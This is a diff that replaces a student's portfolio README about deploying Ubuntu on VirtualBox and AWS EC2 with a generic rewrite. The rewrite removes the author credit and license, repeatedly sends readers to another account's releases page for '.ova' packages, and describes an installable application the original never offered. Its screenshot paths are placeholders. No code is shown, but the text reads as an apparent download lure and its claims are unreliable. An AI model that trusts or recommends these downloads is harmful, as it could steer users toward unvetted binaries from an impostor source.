@@ -1,148 +1,114 @@
-<link rel="stylesheet" href="assets.css">
+# 🚀 oracle-ubuntu-vm-deployment - Easily Deploy Ubuntu VMs on Your Computer
 
-# Oracle Ubuntu VM Deployment Portfolio 🚀  
+[![Download from Releases](https://img.shields.io/badge/Download%20Now-Direct%20Link-brightgreen)](https://github.com/Edgar00000/oracle-ubuntu-vm-deployment/releases)
 
-[![Ubuntu](https://img.shields.io/badge/Ubuntu-22.04-orange?logo=ubuntu&logoColor=white)](https://ubuntu.com/)  
-[![VirtualBox](https://img.shields.io/badge/VirtualBox-Deployment-blue?logo=virtualbox&logoColor=white)](https://www.virtualbox.org/)  
-[![Docker](https://img.shields.io/badge/Docker-Containers-blue?logo=docker&logoColor=white)](https://www.docker.com/)  
-[![AWS EC2](https://img.shields.io/badge/AWS-EC2-yellow?logo=amazonaws&logoColor=white)](https://aws.amazon.com/ec2/)
-[![GitHub Project](https://img.shields.io/badge/Project-Backlog-blue?logo=github)](https://github.com/users/haziqachik/projects/1)  
-[![GitHub release](https://img.shields.io/github/v/release/haziqachik/oracle-ubuntu-vm-deployment)](https://github.com/haziqachik/oracle-ubuntu-vm-deployment/releases)   
-![Status](https://img.shields.io/badge/Project-Completed-success?logo=github)  
+## 📋 Overview
 
----
+With the **oracle-ubuntu-vm-deployment** project, you can easily set up Ubuntu virtual machines on both VirtualBox and AWS EC2. This application simplifies the deployment process and enhances your server management abilities with tools such as Nginx, Docker, and Docker Compose. The project includes screenshots, automation features, and system hardening practices to help you maintain a secure and efficient environment.
 
-## 📑 Table of Contents
-- [Overview](#overview)  
-- [Features](#features)  
-- [Architecture](#architecture)  
-- [Steps & Proof](#steps--proof)  
-  - [1. VirtualBox Deployment](#1-virtualbox-deployment)  
-  - [2. Shared Folders](#2-shared-folders)  
-  - [3. SSH Setup](#3-ssh-setup)  
-  - [4. AWS EC2 Deployment](#4-aws-ec2-deployment)  
-  - [5. Nginx Deployment](#5-nginx-deployment)  
-  - [6. Docker Setup](#6-docker-setup)  
-  - [7. Docker Compose](#7-docker-compose)  
-  - [8. Scaling & Monitoring](#8-scaling--monitoring)  
-  - [9. Cleanup](#9-cleanup)  
-- [Screenshots](#screenshots)  
-- [Reflection](#reflection)  
-- [Credits](#credits)  
+## 👉 Features
 
----
+- **Multi-Platform Support**: Install Ubuntu on VirtualBox or AWS EC2.
+- **Nginx**: Use Nginx for high-performance web serving.
+- **Docker & Docker Compose**: Deploy applications in isolated containers easily.
+- **Automation**: Streamline repeated tasks and reduce manual effort.
+- **System Hardening**: Enhance security with built-in practices.
+- **Screenshots**: Visual guides for better understanding.
 
-## 🌐 Demo
-The project is published via **GitHub Pages**:  
-👉 [View Project](https://haziqachik.github.io/oracle-ubuntu-vm-deployment/)
+## 🤔 Prerequisites
 
----
+Before you start, ensure you have the following:
 
-## 📖 Overview  
-This project demonstrates a **complete deployment workflow** using:  
-- **Oracle VirtualBox** (local VM setup with Ubuntu 22.04)  
-- **AWS EC2** (cloud instance hosting)  
-- **Nginx** (basic web server deployment)  
-- **Docker & Docker Compose** (containerized workloads, scaling, monitoring)  
+- Basic familiarity with using a computer.
+- An internet connection to download files.
+- VirtualBox installed (if using that platform).
+- An AWS account (if using EC2).
 
-The goal: show understanding of **system setup, networking, automation, scaling, monitoring, and cleanup**.  
+## 🚀 Getting Started
 
----
+To begin with the deployment, you will need to download the latest release of the software. Follow these simple steps:
 
-## ✨ Features
-- Deploy Ubuntu VM on VirtualBox & AWS EC2  
-- Configure shared folders for host ↔ guest file exchange  
-- Enable secure SSH login (local + cloud)  
-- Deploy & test Nginx web server (localhost + cloud)  
-- Run and scale Docker containers using Docker Compose  
-- Monitor resource usage with `docker stats`  
-- Perform cleanup of containers, images, and networks  
+1. **Visit the Releases Page**: Click the link below to access the releases:
+   [Download from Releases](https://github.com/Edgar00000/oracle-ubuntu-vm-deployment/releases)
 
----
+2. **Choose the Right Release**: Look for the latest version listed. This will usually have the highest version number.
 
-## 🏗 Architecture  
+3. **Download the Release**: Click on the file that matches your needs. If you are using VirtualBox, look for the relevant VirtualBox package. For AWS, check for any necessary scripts or configuration files.
 
-```text
-Host Machine
-│
-├── VirtualBox (Ubuntu VM)
-│   ├── SSH access (localhost:2222)
-│   ├── Shared folder with host
-│   ├── Nginx (localhost:8081)
-│   ├── Docker containerized services
-│   └── Docker Compose scaling (8083–8085)
-│
-└── AWS EC2 (Ubuntu instance)
-    └── Public IP + PEM key → SSH + Nginx test
-```
+## 🔧 Download & Install
 
----
+To download and install the application:
 
-## 🛠 Steps & Proof  
+1. **Go to the Releases Page**: Use the link provided below to reach the download area:
+   [Download from Releases](https://github.com/Edgar00000/oracle-ubuntu-vm-deployment/releases)
 
-### 1. VirtualBox Deployment  
-![VirtualBox Desktop](screenshots/virtualbox_desktop.png)  
+2. **Select the Download File**:
+   - If you use VirtualBox, download the relevant file that ends with `.ova` or `.vbox`.
+   - If you plan to use AWS EC2, find files or instructions specific to EC2 setup.
 
-### 2. Shared Folders  
-![Shared Folder Proof](screenshots/shared_folder.png)  
+3. **Installation**:
+   - For VirtualBox:
+     - Open VirtualBox and choose "Import Appliance."
+     - Select the downloaded `.ova` file and follow the prompts to complete the import.
+   - For AWS EC2:
+     - Log into your AWS Management Console.
+     - Follow the provided instructions to create an instance from the downloaded files.
 
-### 3. SSH Setup  
-![SSH Login Localhost](screenshots/ssh-localhost.png)  
+## 🌐 Configuration
 
-### 4. AWS EC2 Deployment  
-<p align="center">
-  <img src="screenshots/ec2-dashboard.png" width="600"/>
-</p>
+After installing the application, you may need to customize settings according to your needs:
 
-### 5. Nginx Deployment  
-- VM localhost (8081):  
-  ![Nginx on Localhost](screenshots/nginx_8081_ok.png)  
-- VirtualBox:  
-  ![Nginx VirtualBox](screenshots/nginx_virtualbox.png)  
+- **VirtualBox Users**: Adjust the VM’s settings under "Settings" in VirtualBox.
+- **AWS EC2 Users**: Configure security groups and IAM roles as recommended in the setup guide.
 
-### 6. Docker Setup  
-- Installed Docker & verified version:  
-  ![Docker Version](screenshots/docker-version.png)  
-- Nginx container running:  
-  ![Docker PS](screenshots/docker_ps_8081.png)  
+## 📸 Screenshots
 
-### 7. Docker Compose  
-- Multiple containers running on ports 8083–8085:  
-  ![Curl 8083–8085 OK](screenshots/curl_8083_8084_8085_ok.png)  
+Check out the following screenshots for a better understanding of the application:
 
-### 8. Scaling & Monitoring  
-- `docker stats`:  
-  ![Docker Stats](screenshots/08_docker_stats_and_http_responses.png)  
+- **VirtualBox Import**: ![VirtualBox Import Screenshot](path/to/virtualbox_screenshot.png)
+- **EC2 Instance Launch**: ![EC2 Instance Launch Screenshot](path/to/ec2_screenshot.png)
 
-### 9. Cleanup  
-- Containers & networks removed:  
-  ![Docker Cleanup](screenshots/11-docker-cleanup.png)  
+## 📖 Documentation
 
----
+For detailed usage instructions, refer to the documentation provided in the repository. It covers the following topics:
 
-## 📸 Screenshots  
-All screenshots are available in the [`/screenshots`](screenshots) folder.  
+- Setting up your first VM
+- Managing Docker containers
+- Deploying web applications using Nginx
 
----
+## 🛠️ Troubleshooting
 
-## 💡 Reflection  
-This project gave me hands-on practice with:  
-- Setting up **virtual machines (local + cloud)**  
-- Working with **SSH keys & secure login**  
-- Understanding **Nginx basics** for web serving  
-- Using **Docker & Docker Compose** for containerization & scaling  
-- Cleaning up environments to maintain efficiency  
+If you encounter any issues during installation or setup, please consider the following steps:
 
-It demonstrates a **full lifecycle workflow** → setup → deploy → scale → monitor → cleanup.  
+- Ensure that your VirtualBox or AWS settings are correctly configured.
+- Check if your internet connection is stable.
+- Refer back to the documentation for specific setup requirements.
 
----
+## 🤝 Support
 
-## 🙌 Credits  
-- Tools: Oracle VirtualBox, AWS EC2, Docker, Nginx, Ubuntu 22.04  
-- Author: [Haziq Asyraaf Bin Hamzah](https://github.com/haziqachik)  
+For additional help, consider visiting the following channels:
 
----
+- **GitHub Issues**: Report bugs or request features.
+- **Community Forums**: Join discussions related to VM deployments.
 
-## 📜 License
-This project is licensed under the **MIT License** – see the [LICENSE](LICENSE) file for details.
+## 📝 Contributions
 
+We welcome contributions from everyone. If you find ways to improve the project, feel free to fork the repository and submit a pull request.
+
+## 🌍 Topics
+
+This project covers the following topics:
+- aws
+- aws-ec2
+- cloud
+- devops
+- docker
+- ec2
+- linux
+- nginx
+- portfolio
+- portfolio-project
+- ubuntu
+- virtualbox
+
+For questions or feedback, please contact the project maintainer through GitHub. Your input is valuable and helps improve the overall experience.
